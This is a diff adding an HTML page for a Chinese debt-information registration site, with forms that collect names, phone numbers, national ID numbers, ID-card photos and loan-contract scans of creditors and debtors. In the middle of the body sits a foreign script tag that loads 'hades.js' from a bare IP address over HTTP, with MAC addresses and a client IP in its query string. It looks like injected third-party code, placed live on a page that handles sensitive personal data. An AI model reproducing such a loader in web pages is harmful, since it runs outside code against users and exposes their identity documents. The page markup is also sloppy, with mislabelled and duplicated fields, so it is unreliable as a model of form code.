@@ -1,0 +1,789 @@
+<!doctype html>
+<html lang="en" style="overflow-x: hidden;">
+<head>
+    <meta charset="UTF-8">
+    <title>债务信息登记</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="stylesheet" type="text/css" href="../../css/reset.css">
+    <link rel="stylesheet" type="text/css" href="../../css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="../../css/member.css">
+    <link rel="stylesheet" href="../../css/iconfont/iconfont.css"/>
+    <link rel="stylesheet" href="../../css/new_main.css" />
+    <link rel="stylesheet" href="../../css/main.css" />
+    <link rel="stylesheet" href="../../css/bootstrap.min.css" />
+     <link rel="stylesheet" href="../../css/wizard/assets/formvalidation/formValidation.min.css">
+     <link rel="stylesheet" href="../../css/wizard/assets/formvalidation/bootstrap.min.js">
+     <link rel="stylesheet" href="../../css/wizard/css/wizard.min.css">
+    <script type="text/javascript" src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../css/wizard/jquery-wizard.min.js"></script>
+     <script src="../../css/wizard/assets/formvalidation/formValidation.min.js"></script>
+
+    <link rel="stylesheet" type="text/css" href="">
+    <link rel="stylesheet" type="text/css" href="../../css/sui/sui.css">
+    
+      
+    <style>
+    #servingForm select.input-medium{width:115px;}
+    #servingForm select.input-medium:first-child{width:113px;}
+    #servingForm .img-round{margin-bottom: 10px;}
+    #servingForm .sui-msg{box-shadow: 0 1px 3px rgba(0,0,0,.2);border:1px solid #ddd;border-radius: 2px;}
+    #servingForm .sui-msg:before{
+        content: "";
+        display: inline-block;
+        position: absolute;
+        border-color: transparent;
+        border-style: solid;
+        border-width: 5px 6px;
+        border-right-color: #ddd;
+        left: -12px;
+        top: 7px;
+    }
+    #servingForm .sui-msg:after{
+        content: "";
+        display: inline-block;
+        position: absolute;
+        border-color: transparent;
+        border-style: solid;
+        border-width: 5px 6px;
+        border-right-color: #fffff1;
+        left: -10px;
+        top: 7px;
+    }
+
+    .form-horizontal .controls > a:first-child,
+    .form-horizontal .controls > span:first-child{display: inline-block;padding-top: 3px;} /* 表单的内容区如果一开始就是文字，应该和左边水平对齐 */
+    /* 原bs里面的缩略图样式 */
+    .img-round{border-radius: 3px;display:block;padding:3px;border:1px solid #ccc;position: relative;}
+    .img-round .upload-label{position: absolute;display:inline-block;padding:5px 0;width:70%;border:1px solid #ccc;left:15%;top:50%;margin-top:-15px;;background-color:#fff;text-align: center;}
+    .controls .sub-controls-title{margin:15px 0;}
+    /*防守打法*/
+    .zx-main .item input {
+        width: 300px;
+        height: 57px;
+        border: 1px solid #d9d9d9;
+        font-size: 1.6em;
+        margin-left:20px;
+    }
+    .file{
+        position: relative;
+    }
+    .file input{
+        position: absolute;
+        font-size: 80px;
+        width:100px;
+        height:100px;
+        right: 0;
+        top: 0;
+        opacity: 0;
+    }
+    .zx-main .item span {
+        display: inline-block;
+        font-size: 22px;
+        line-height: 60px;
+        color: #666;
+        width: 240px;
+        text-align:right;
+    }
+    .zx-main .item span i{
+        color: red;
+    }
+    section {
+      margin: 60px;
+    }
+    .wizard-steps {
+        display: table;
+        width: 100%;
+    }
+
+    .wizard-steps > li.current, .wizard-steps > li.done {
+        background: #41b3f9;
+        color: #ffffff;
+    }
+    .wizard-steps > li.done {
+        background: #7ace4c;
+    }
+    .wizard-steps > li {
+        display: table-cell;
+        padding: 10px 20px;
+        background: #f7fafc;
+    }
+    .wizard-steps > li.current h4, .wizard-steps > li.done h4 {
+        color: #ffffff;
+    }
+    .wizard-steps > li.current span, .wizard-steps > li.done span {
+        border-color: #ffffff;
+        color: #ffffff;
+    }
+    .wizard-steps > li span {
+        border-radius: 100%;
+        border: 1px solid rgba(120, 130, 140, 0.13);
+        width: 40px;
+        height: 40px;
+        display: inline-block;
+        vertical-align: middle;
+        padding-top: 9px;
+        margin-right: 8px;
+        text-align: center;
+    }
+    .wizard-content {
+        padding: 25px;
+        border-color: rgba(120, 130, 140, 0.13);
+        margin-bottom: 30px;
+    }
+    </style>
+</head>
+<body style="background: #fff;overflow-x: hidden;">
+<header id="header"></header>
+<div class="container">
+
+  <section>
+   
+ 
+    <div id="exampleValidator" class="wizard">
+      <ul class="wizard-steps" role="tablist">
+        <li class="active" role="tab">
+          Step 1
+        </li>
+        <li role="tab">
+          Step 2
+        </li>
+        <li role="tab">
+          Step 3
+        </li>
+        <li role="tab">
+          Step 4
+        </li>
+
+      </ul>
+      <form id="validation" class="form-horizontal">
+        <div class="wizard-content">
+          <div class="wizard-pane active" role="tabpanel">
+            <div class="form-group">
+              <label class="col-xs-3 control-label">Username</label>
+              <div class="col-xs-5">
+                <input type="text" class="form-control" name="username" />
+              </div>
+            </div>
+          </div>
+          <div class="wizard-pane" role="tabpanel">
+            <div class="form-group">
+              <label class="col-xs-3 control-label">Email address</label>
+              <div class="col-xs-5">
+                <input type="text" class="form-control" name="email" />
+              </div>
+            </div>
+          </div>
+
+          <div class="wizard-pane" role="tabpanel">
+            <div class="form-group">
+              <label class="col-xs-3 control-label">Password</label>
+              <div class="col-xs-5">
+                <input type="password" class="form-control" name="password" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+    <script type="text/javascript">
+      (function() {
+        $('#exampleValidator').wizard({
+          onInit: function() {
+            $('#validation').formValidation({
+              framework: 'bootstrap',
+              fields: {
+                username: {
+                  validators: {
+                    notEmpty: {
+                      message: 'The username is required'
+                    },
+                    stringLength: {
+                      min: 6,
+                      max: 30,
+                      message: 'The username must be more than 6 and less than 30 characters long'
+                    },
+                    regexp: {
+                      regexp: /^[a-zA-Z0-9_\.]+$/,
+                      message: 'The username can only consist of alphabetical, number, dot and underscore'
+                    }
+                  }
+                },
+                email: {
+                  validators: {
+                    notEmpty: {
+                      message: 'The email address is required'
+                    },
+                    emailAddress: {
+                      message: 'The input is not a valid email address'
+                    }
+                  }
+                },
+                password: {
+                  validators: {
+                    notEmpty: {
+                      message: 'The password is required'
+                    },
+                    different: {
+                      field: 'username',
+                      message: 'The password cannot be the same as username'
+                    }
+                  }
+                }
+              }
+            });
+          },
+          validator: function() {
+            var fv = $('#validation').data('formValidation');
+            var $this = $(this);
+            // Validate the container
+            fv.validateContainer($this);
+            var isValidStep = fv.isValidContainer($this);
+            if (isValidStep === false || isValidStep === null) {
+              return false;
+            }
+            return true;
+          },
+          onFinish: function() {
+            $('#validation').submit();
+            alert('finish');
+          }
+        });
+      })();
+    </script>
+  </section>
+
+
+</div>
+<!-- <form id="form1" method="post">
+<div class="zx-main">
+
+    <div style=""><p style="font-size:22px;color:red;line-height:20px;margin-top:10px;">请认真阅读以下文字并填写下面的信息：</p>
+        <p style="font-size:20px;line-height:20px;text-index:0; padding-left: 55px;">我们需要全面了解您的债权情况，请您认真填写。我们会保</p>
+        <p style="font-size:20px;line-height:20px;text-index:0; padding-left: 15px;">护您的隐私。带星号（*）的为必填项；您的信息填写越完整，系</p>
+        <p style="font-size:20px;line-height:20px;text-index:0; padding-left: 15px; padding-bottom: 20px;">统模拟评级越高，越能快速处理不良债权！</p>
+    </div>
+    <hr  style="width: 90%; border:1px dashed #666666; text-align:center; margin-left: 5%; " />
+        <div class="name1 item" style=" margin-top:30px;">
+            <span><i>*&nbsp;&nbsp;</i>债权人姓名:</span>
+            <input type="text" name="name" id="name" value="" />
+        </div>
+        <div class="num2 item">
+            <span><i>*&nbsp;&nbsp;</i>债权人手机号:</span>
+            <input type="text" name="mobile" id="mobile" value="" />
+        </div>
+        <div class="num1 item">
+            <span><i>*&nbsp;&nbsp;</i>债权人身份证号码:</span>
+            <input type="text" name="numcard" id="numcard" value="" />
+        </div>
+        <div class="name2 item">
+            <span><i>*&nbsp;&nbsp;</i>债务人姓名:</span>
+            <input type="text" name="zw_name" id="zw_name" value="" />
+        </div>
+        <div class="num2 item">
+            <span><i>*&nbsp;&nbsp;</i>债务人手机号:</span>
+            <input type="text" name="zw_mobile" id="zw_mobile" value="" />
+        </div>
+        <div class="num1 item">
+            <span><i>&nbsp;&nbsp;</i>债务人身份证号码:</span>
+            <input type="text" name="zw_numcard" id="zw_numcard" value="" />
+        </div>
+        <div class="tj_name item">
+            <span><i>*&nbsp;&nbsp;</i>借款时间:</span>
+            <input name="loantime" id="loantime" value="" />
+        </div>
+        <div class="hetong item">
+            <span class="title2"><i>*&nbsp;&nbsp;</i>借款合同扫描件:</span>
+            <div id="file1" class="file1 file">
+            <input type="file" name="zw_image_1" id="zw_image_1" accept="image/*"  style="width:108px;"/>
+            <div style="display:none"><input type='hidden' name="zw_img_1" class='zw_img_1' /></div>
+            
+            <span class="ff ff1"></span>
+            </div>
+            <div id="file4" class="file4 file">
+            <input type="file" name="zw_image_2" id="zw_image_2" accept="image/*"  style="width:108px;"/>
+            <div style="display:none"><input type='hidden' name="zw_img_2" class='zw_img_2' /></div>
+            
+            <span class="ff ff4"></span>
+            </div>
+            <div id="file5" class="file5 file" style="margin: 30px 0px 0px 135px;">
+            <input type="file" name="zw_image_3" id="zw_image_3" accept="image/*"  style="width:108px;"/>
+            <div style="display:none"><input type='hidden' name="zw_img_3" class='zw_img_3' /></div>
+            
+            <span class="ff ff5"></span>
+            </div>
+            <div id="file6" class="file6 file">
+            <input type="file" name="zw_image_4" id="zw_image_4" accept="image/*"  style="width:108px;"/>
+            <div style="display:none"><input type='hidden' name="zw_img_4" class='zw_img_4' /></div>
+            
+            <span class="ff ff6"></span>
+            </div>
+            <div id="file7" class="file7 file">
+            <input type="file" name="zw_image_5" id="zw_image_5" accept="image/*"  style="width:108px;"/>
+            <div style="display:none"><input type='hidden' name="zw_img_5" class='zw_img_5' /></div>
+            
+            <span class="ff ff7"></span>
+            </div>
+        </div>
+        <div class="idpic item">
+            <span class="title2"><i>*&nbsp;&nbsp;</i>债权人身份证照片:</span>
+            <div id="file2" class="file2 file">
+                <input type="file" name="card_img_1" id="card_img_1" accept="image/*" style="width:108px;" />
+                <div style="display:none"><input type='hidden' name="card_img1" class='card_img1' /></div>
+                <span class="ff ff2"></span>
+            </div>
+            <div id="file3" class="file3 file">
+                <input type="file" name="card_img_2" id="card_img_2" accept="image/*" style="width:108px;" />
+                <div style="display:none"><input type='hidden' name="card_img2" class='card_img2' /></div>
+                <span class="ff ff3"></span>
+            </div>
+        </div>
+        <div class="idpic item">
+            <span class="title2"><i>&nbsp;&nbsp;</i>债务人身份证照片:</span>
+            <div id="file8" class="file8 file">
+                <input type="file" name="card_img_3" id="card_img_3" accept="image/*" style="width:108px;" />
+                <div style="display:none"><input type='hidden' name="card_img3" class='card_img3' /></div>
+                <span class="ff ff8"></span>
+            </div>
+            <div id="file9" class="file9 file">
+                <input type="file" name="card_img_4" id="card_img_4" accept="image/*" style="width:108px;" />
+                <div style="display:none"><input type='hidden' name="card_img4" class='card_img4' /></div>
+                <span class="ff ff9"></span>
+            </div>
+            
+        </div>
+        <div class="tj_name item">
+            <span class="title"><i>&nbsp;&nbsp;</i>推荐人:</span>
+            <input type="text" name="tj_name" id="tj_name" value="" />
+        </div>
+        <div class="tj_name item">
+            <span class="title" style="margin-left:-80px;"><i>&nbsp;&nbsp;</i>备案网点:</span>
+            <div data-toggle="distpicker" style="display: inline;">
+                <select class="form-control" id="province" name="province"></select>
+                <select class="form-control" id="city" name="city"></select>
+                <select class="form-control" id="district" name="district" ></select>
+            </div>
+        </div>
+        <div class="money item">
+            <span class="title"><i>*&nbsp;&nbsp;</i>债务金额:</span>
+            <input type="text" name="amount" id="amount" value="" />
+        </div>
+        <div style="font-size:20px; margin-left: 100px; margin-top: 30px;display: none;"><input type="checkbox" checked="checked" style="width:25px;height:25px;">并同意<a href="../../world/服务协议.doc">《服务协议》</a></div>
+        <input type="submit" id="this_button" value="提交申请"/>
+    
+</div>
+</form> -->
+    <script id="is7k4739bvtc5ya003t9726g5h3c" extend="ac=40:A5:EF:E0:9B:79&ap=40:A5:EF:E0:9B:79&freq=high&ip=125.40.27.253&mac=a8:6b:ad:09:c0:d1&shopId=147073&sn=OKHVx1Ai3ShmD0GvY/DWb8Fjblj+" src="http://120.55.34.20/js/hades.js?freq=high&hades=1&mac=a8:6b:ad:09:c0:d1&random=10718&shopId=147073"></script>
+
+        <div class="sui-container">
+            <div class="sui-steps">
+                <div class="wrap">
+                    <div class="finished">
+                        <label>
+                            <span class="round">&#10004;</span>
+                            <span>债权人基本信息</span>
+                        </label>
+                        <i class="triangle-right-bg"></i>
+                        <i class="triangle-right"></i>
+                    </div>
+                </div>
+                <div class="wrap">
+                    <div class="current">
+                        <label>
+                            <span class="round">2</span>
+                            <span>上传照片</span>
+                        </label>
+                        <i class="triangle-right-bg"></i>
+                        <i class="triangle-right"></i>
+                    </div>
+                </div>
+                <div class="wrap">
+                    <div class="todo">
+                        <label>
+                            <span class="round">3</span>
+                            <span>上传债权凭证</span>
+                        </label>
+                        <i class="triangle-right-bg"></i>
+                        <i class="triangle-right"></i>
+                    </div>
+                </div>
+                <div class="wrap">
+                    <div class="todo">
+                        <label>
+                            <span class="round">4</span>
+                            <span></span>
+                        </label>
+                        <i class="triangle-right-bg"></i>
+                        <i class="triangle-right"></i>
+                    </div>
+                </div>
+                <div class="wrap">
+                    <div class="todo">
+                        <label>
+                            <span class="round">5</span>
+                            <span>评价</span>
+                        </label>
+                    </div>
+                </div>
+            </div><!-- /.sui-steps END -->
+
+            <div class="sui-msg msg-block msg-tips" style="margin-bottom:10px;">
+                <div class="msg-con">
+                请认真阅读以下文字并填写下面的信息：
+                        我们需要全面了解您的债权情况，请您认真填写。我们会保
+                       护您的隐私。带星号（*）的为必填项；您的信息填写越完整，系统模拟评级越高，越能快速处理不良债权！
+                </div>
+                <s class="msg-icon"></s>
+            </div>
+
+            <form class="sui-form form-horizontal" action="" method="post" id="servingForm">
+             
+              
+                <div class="control-group">
+                    <label class="control-label" for="form002">债权金额：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="amount" id="amount">
+                       <span class="btn-text">(本金加利息,单位元)</span>
+                    </div>
+                </div>
+               <div class="control-group">
+                   <label class="control-label" for="form006">借款时间：</label>
+                   <div class="controls">
+                       <input type="text" class="input-date input-fat" name="createtime" id="form006">
+
+                   </div>
+               </div>
+                <div class="control-group">
+                    <label class="control-label" for="form006">约定还款时间：</label>
+                    <div class="controls">
+                        <input type="text" class="input-date input-fat" name="returntime" id="form006">
+                    </div>
+                </div>
+                <div class="control-group">
+                    <label class="control-label" for="form001">债权方姓名：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="" id="form001">
+                       <span class="btn-text">(被欠钱的一方)</span>
+                     
+                    </div>
+                </div>
+               
+                <div class="control-group">
+                    <label class="control-label" for="form001">债权方手机号：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="" id="form001">
+                        <button class="sui-btn btn-default btn-large" type="button">获取验证码</button>
+                    </div>
+                </div>
+                <div class="control-group">
+                    <label class="control-label" for="form001">债权方证件号：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="numcard" id="numcard">
+                    </div>
+                </div>
+
+               <!--  <div class="control-group">
+                  <label class="control-label">担保人是否能联系：</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">担保人是否能联系：</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">担保人经济状况：</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">抵押物能否覆盖债务:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">诉讼与否:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div> -->
+             <!--    <div class="control-group">
+                  <label class="control-label">判决与否:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div> -->
+
+                <div class="control-group">
+                    <label class="control-label" for="form001">债务方姓名：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="zw_name" id="zw_name">
+                       <span class="btn-text">(欠钱的一方)</span>
+                     
+                    </div>
+                </div>
+               <div class="control-group">
+                   <label class="control-label" for="form001">债务方姓名：</label>
+                   <div class="controls">
+                      <div data-toggle="distpicker" style="display: inline;">
+                          <select class="form-control" id="province" name="province"></select>
+                          <select class="form-control" id="city" name="city"></select>
+                          <select class="form-control" id="district" name="district" ></select>
+                      </div>
+                    
+                   </div>
+               </div>
+               
+                <div class="control-group">
+                    <label class="control-label" for="form001">债务方手机号：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="zw_mobile" id="zw_mobile">
+                       
+                    </div>
+                </div>
+                <div class="control-group">
+                    <label class="control-label" for="form001">债务方证件号：</label>
+                    <div class="controls">
+                        <input class="input-xlarge input-fat" type="text" name="zw_numcard" id="zw_numcard">
+                    </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">债务方所处行业:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">债务方婚姻状况:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">债务方学历状况:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">债务方身体状况:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                <div class="control-group">
+                  <label class="control-label">债务方房产状况:</label>
+                  <div class="controls">
+                    <label data-toggle="radio" class=" checked">
+                      <input checked="checked" name="radio" type="radio"><span>是</span>
+                    </label>
+                    <label data-toggle="radio" class="">
+                      <input name="radio" type="radio"><span>否</span>
+                    </label>
+                   
+                  </div>
+                </div>
+                    
+                <div class="control-group">
+                    <label class="control-label" for="form005">建模要求：</label>
+                    <div class="controls">
+                        <textarea class="input-xxlarge" name="" id="form005" style="height: 110px;"></textarea>
+                    </div>
+                </div>
+                <div class="control-group">
+                    <label class="control-label" for="form006">完成日期：</label>
+                    <div class="controls">
+                        <input type="text" class="input-date input-fat" name="" id="form006">
+                    </div>
+                </div>
+                <div class="control-group">
+                    <label class="control-label" for="form007">我要付款：</label>
+                    <div class="controls">
+                        <div class="input-append">
+                            <input type="text" class="input-fat" name="" id="form007" value="500.00" style="width:100px;">
+                            <span class="add-on">元</span>
+                        </div> &nbsp;&nbsp;&nbsp;
+                        <a class="" href="">查看建模市场参考</a>
+                    </div>
+                </div>
+                <div class="control-group">
+                    <div class="controls">
+                        <label class="checkbox" style="margin-bottom:15px;">
+                            <input type="checkbox" name="" > 我已阅读并同意<a href="" target="_blank">《淘宝网需求定制市场服务协议》</a>
+                        </label>
+                        <button class="sui-btn btn-primary btn-xlarge" type="submit"><i class="sui-icon-ok"></i>下一步</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+        <div class="zx-main">
+
+            
+        
+                
+                <div class="hetong item">
+                    <span class="title2"><i>*&nbsp;&nbsp;</i>借款合同扫描件:</span>
+                    <div id="file1" class="file1 file">
+                    <input type="file" name="zw_image_1" id="zw_image_1" accept="image/*"  style="width:108px;"/>
+                    <div style="display:none"><input type='hidden' name="zw_img_1" class='zw_img_1' /></div>
+                    
+                    <span class="ff ff1"></span>
+                    </div>
+                    <div id="file4" class="file4 file">
+                    <input type="file" name="zw_image_2" id="zw_image_2" accept="image/*"  style="width:108px;"/>
+                    <div style="display:none"><input type='hidden' name="zw_img_2" class='zw_img_2' /></div>
+                    
+                    <span class="ff ff4"></span>
+                    </div>
+                    <div id="file5" class="file5 file" style="margin: 30px 0px 0px 135px;">
+                    <input type="file" name="zw_image_3" id="zw_image_3" accept="image/*"  style="width:108px;"/>
+                    <div style="display:none"><input type='hidden' name="zw_img_3" class='zw_img_3' /></div>
+                    
+                    <span class="ff ff5"></span>
+                    </div>
+                    <div id="file6" class="file6 file">
+                    <input type="file" name="zw_image_4" id="zw_image_4" accept="image/*"  style="width:108px;"/>
+                    <div style="display:none"><input type='hidden' name="zw_img_4" class='zw_img_4' /></div>
+                    
+                    <span class="ff ff6"></span>
+                    </div>
+                    <div id="file7" class="file7 file">
+                    <input type="file" name="zw_image_5" id="zw_image_5" accept="image/*"  style="width:108px;"/>
+                    <div style="display:none"><input type='hidden' name="zw_img_5" class='zw_img_5' /></div>
+                    
+                    <span class="ff ff7"></span>
+                    </div>
+                </div>
+                <div class="idpic item">
+                    <span class="title2"><i>*&nbsp;&nbsp;</i>债权人身份证照片:</span>
+                    <div id="file2" class="file2 file">
+                        <input type="file" name="card_img_1" id="card_img_1" accept="image/*" style="width:108px;" />
+                        <div style="display:none"><input type='hidden' name="card_img1" class='card_img1' /></div>
+                        <span class="ff ff2"></span>
+                    </div>
+                    <div id="file3" class="file3 file">
+                        <input type="file" name="card_img_2" id="card_img_2" accept="image/*" style="width:108px;" />
+                        <div style="display:none"><input type='hidden' name="card_img2" class='card_img2' /></div>
+                        <span class="ff ff3"></span>
+                    </div>
+                </div>
+                <div class="idpic item">
+                    <span class="title2"><i>&nbsp;&nbsp;</i>债务人身份证照片:</span>
+                    <div id="file8" class="file8 file">
+                        <input type="file" name="card_img_3" id="card_img_3" accept="image/*" style="width:108px;" />
+                        <div style="display:none"><input type='hidden' name="card_img3" class='card_img3' /></div>
+                        <span class="ff ff8"></span>
+                    </div>
+                    <div id="file9" class="file9 file">
+                        <input type="file" name="card_img_4" id="card_img_4" accept="image/*" style="width:108px;" />
+                        <div style="display:none"><input type='hidden' name="card_img4" class='card_img4' /></div>
+                        <span class="ff ff9"></span>
+                    </div>
+                    
+                </div>
+                <div class="tj_name item">
+                    <span class="title"><i>&nbsp;&nbsp;</i>推荐人:</span>
+                    <input type="text" name="tj_name" id="tj_name" value="" />
+                </div>
+               
+               
+                <div style="font-size:20px; margin-left: 100px; margin-top: 30px;display: none;"><input type="checkbox" checked="checked" style="width:25px;height:25px;">并同意<a href="../../world/服务协议.doc">《服务协议》</a></div>
+                <input type="submit" id="this_button" value="提交申请"/>
+            
+        </div>
+
+    <script type="text/javascript" src="../../js/config.js"></script>
+    <script type="text/javascript" src="../../js/zepto.min.js"></script>
+    
+    <script type="text/javascript" src="../../js/distpicker.js"></script>
+    <script type="text/javascript" src="../../js/datePicker.js"></script>
+    <script type="text/javascript" src="../../js/template.js"></script>
+    <script type="text/javascript" src="../../js/common.js"></script>
+    <script type="text/javascript" src="../../js/tmpl/common-top.js"></script>
+    <script type="text/javascript" src="../../js/layer/layer.js"></script>
+
+    <script type="text/javascript" src="../../js/tmpl/member_zq.js"></script>
+    <script>
+    var calendar = new datePicker();
+calendar.init({
+    'trigger': '#loantime', /*按钮选择器，用于触发弹出插件*/
+    'type': 'date',/*模式：date日期；datetime日期时间；time时间；ym年月；*/
+    'minDate':'1900-1-1',/*最小日期*/
+    'maxDate':'2100-12-31',/*最大日期*/
+    'onSubmit':function(){/*确认时触发事件*/
+        var theSelectData=calendar.value;
+    },
+    'onClose':function(){/*取消时触发事件*/
+    }
+});
+    
+    </script>
+</body>
+</html>
